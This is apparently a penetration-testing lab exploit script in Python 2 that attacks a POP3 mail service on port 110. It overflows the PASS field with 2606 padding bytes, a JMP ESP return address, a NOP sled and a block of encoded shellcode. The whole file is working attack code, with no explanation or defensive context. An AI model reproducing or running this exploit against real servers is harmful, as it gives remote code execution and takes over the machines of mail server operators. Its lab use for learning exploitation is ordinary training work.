#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# # 5F4A38F    	FFE4		JMP ESP

shellcode = (
"\xb8\xc8\xbe\xb9\xfd\xd9\xee\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xc7\x04\x31\x47\x0e\x03\x8f\xb0\x5b\x08\xf3\x25\x19"
"\xf3\x0b\xb6\x7e\x7d\xee\x87\xbe\x19\x7b\xb7\x0e\x69\x29\x34"
"\xe4\x3f\xd9\xcf\x88\x97\xee\x78\x26\xce\xc1\x79\x1b\x32\x40"
"\xfa\x66\x67\xa2\xc3\xa8\x7a\xa3\x04\xd4\x77\xf1\xdd\x92\x2a"
"\xe5\x6a\xee\xf6\x8e\x21\xfe\x7e\x73\xf1\x01\xae\x22\x89\x5b"
"\x70\xc5\x5e\xd0\x39\xdd\x83\xdd\xf0\x56\x77\xa9\x02\xbe\x49"
"\x52\xa8\xff\x65\xa1\xb0\x38\x41\x5a\xc7\x30\xb1\xe7\xd0\x87"
"\xcb\x33\x54\x13\x6b\xb7\xce\xff\x8d\x14\x88\x74\x81\xd1\xde"
"\xd2\x86\xe4\x33\x69\xb2\x6d\xb2\xbd\x32\x35\x91\x19\x1e\xed"
"\xb8\x38\xfa\x40\xc4\x5a\xa5\x3d\x60\x11\x48\x29\x19\x78\x05"
"\x9e\x10\x82\xd5\x88\x23\xf1\xe7\x17\x98\x9d\x4b\xdf\x06\x5a"
"\xab\xca\xff\xf4\x52\xf5\xff\xdd\x90\xa1\xaf\x75\x30\xca\x3b"
"\x85\xbd\x1f\xeb\xd5\x11\xf0\x4c\x85\xd1\xa0\x24\xcf\xdd\x9f"
"\x55\xf0\x37\x88\xfc\x0b\xd0\xbd\x0b\x13\x8f\xaa\x09\x13\xce"
"\x91\x87\xf5\xba\xf5\xc1\xae\x52\x6f\x48\x24\xc2\x70\x46\x41"
"\xc4\xfb\x65\xb6\x8b\x0b\x03\xa4\x7c\xfc\x5e\x96\x2b\x03\x75"
"\xbe\xb0\x96\x12\x3e\xbe\x8a\x8c\x69\x97\x7d\xc5\xff\x05\x27"
"\x7f\x1d\xd4\xb1\xb8\xa5\x03\x02\x46\x24\xc1\x3e\x6c\x36\x1f"
"\xbe\x28\x62\xcf\xe9\xe6\xdc\xa9\x43\x49\xb6\x63\x3f\x03\x5e"
"\xf5\x73\x94\x18\xfa\x59\x62\xc4\x4b\x34\x33\xfb\x64\xd0\xb3"
"\x84\x98\x40\x3b\x5f\x19\x60\xde\x75\x54\x09\x47\x1c\xd5\x54"
"\x78\xcb\x1a\x61\xfb\xf9\xe2\x96\xe3\x88\xe7\xd3\xa3\x61\x9a"
"\x4c\x46\x85\x09\x6c\x43")

buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(('10.11.15.91',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could Not Connect to POP3!"